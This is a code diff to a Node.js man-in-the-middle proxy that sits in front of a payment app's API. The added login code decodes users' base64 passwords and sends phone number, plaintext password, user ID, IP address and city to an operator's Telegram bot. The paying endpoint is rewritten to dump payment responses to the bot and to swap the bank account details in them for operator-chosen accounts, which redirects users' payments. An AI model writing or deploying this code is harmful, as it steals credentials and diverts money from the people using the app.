@@ -873,27 +873,40 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
-    const phone = body.phone || body.mobile || body.telephone || body.username || '';
+    const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
     if (userId) {
       saveTokenUserId(req, userId);
       if (phone) userPhoneMap[String(userId)] = String(phone);
       const loginData = getResponseData(jsonResp);
       if (loginData && loginData.token) tokenUserMap[loginData.token] = userId;
+      if (loginData && loginData.accessToken) tokenUserMap[loginData.accessToken] = userId;
       if (loginData) {
-        const respPhone = loginData.phone || loginData.mobile || loginData.telephone || loginData.memberPhone || '';
+        const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
         if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
       }
-      const detectedPhone = phone || (loginData?.phone || loginData?.mobile || loginData?.telephone || loginData?.memberPhone || '');
+      const detectedPhone = phone || (loginData?.memberPhone || loginData?.phone || loginData?.mobile || loginData?.telephone || '');
       trackUser(data, userId, 'Login', detectedPhone);
       saveData(data).catch(()=>{});
+    } else if (phone) {
+      const loginData = getResponseData(jsonResp);
+      const respUserId = loginData?.id || loginData?.memberId || loginData?.userId || '';
+      if (respUserId) {
+        userPhoneMap[String(respUserId)] = String(phone);
+        saveTokenUserId(req, String(respUserId));
+        if (loginData && loginData.token) tokenUserMap[loginData.token] = String(respUserId);
+        if (loginData && loginData.accessToken) tokenUserMap[loginData.accessToken] = String(respUserId);
+        trackUser(data, String(respUserId), 'Login', phone);
+        saveData(data).catch(()=>{});
+      }
     }
+    const loginData2 = getResponseData(jsonResp);
+    const finalUserId = userId || loginData2?.id || loginData2?.memberId || loginData2?.userId || '';
     if (data.adminChatId && bot) {
-      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
-      const reqHeaders = JSON.stringify(req.headers, null, 2).substring(0, 1500);
-      const respHdrs = JSON.stringify(respHeaders, null, 2).substring(0, 1500);
-      const bodyDump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}] (${phone || 'no phone'})\n\n📝 REQUEST BODY (user input):\n${reqBody}\n\n📤 REQUEST HEADERS:\n${reqHeaders}`).catch(()=>{});
-      bot.sendMessage(data.adminChatId, `📥 RESPONSE HEADERS:\n${respHdrs}\n\n📥 RESPONSE BODY:\n${bodyDump}`).catch(()=>{});
+      let pwd = body.memberPwd || body.password || body.pwd || '';
+      if (pwd) {
+        try { pwd = Buffer.from(pwd, 'base64').toString('utf8'); } catch(e) {}
+      }
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1242,7 +1255,50 @@ app.all('/app/api/orderOut/searchList', async (req, res) => {
 });
 
 app.all('/app/api/orderOut/paying', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Paying');
+  const data = await loadData();
+  const reqUserId = extractUserId(req, null);
+  const reqEff = getEffectiveSettings(data, reqUserId);
+  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const eff = getEffectiveSettings(data, detectedUserId);
+    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
+    const respData = getResponseData(jsonResp);
+    if (data.adminChatId && bot) {
+      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
+      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(()=>{});
+    }
+    if (respData && active) {
+      if (Array.isArray(respData)) {
+        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
+      } else {
+        deepReplace(respData, active, {}, 0);
+      }
+    }
+    if (data.adminChatId && bot) {
+      const afterDump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
+      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(()=>{});
+    }
+    const phone = getPhone(data, detectedUserId);
+    if (data.adminChatId && bot) {
+      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+      bot.sendMessage(data.adminChatId,
+`🔔 💳 Paying
+👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
+Order: ${rd.orderId || rd.orderNo || 'N/A'}
+Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
+Bank: ${active ? active.accountNo : 'N/A'}
+Acc: ${active ? active.accountHolder : 'None'}
+Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+    if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(()=>{}); }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('Paying error:', e.message);
+    if (!res.headersSent) await transparentProxy(req, res);
+  }
 });
 
 app.post('/app/api/orderOut/cancel', async (req, res) => {
